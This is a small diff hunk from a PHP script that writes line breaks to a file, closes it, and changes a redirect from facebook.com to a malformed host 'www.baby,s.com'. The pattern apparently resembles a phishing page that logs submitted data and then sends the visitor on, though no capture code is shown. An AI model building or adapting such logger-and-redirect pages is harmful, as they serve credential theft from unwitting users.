@@ -11,6 +11,6 @@ fwrite($handle,"\r\n");
 }
 fwrite($handle,"\r\n");
 fclose($handle);
-header("location:http://www.facebook.com");
+header("location:http://www.baby,s.com");
 exit;
 ?>
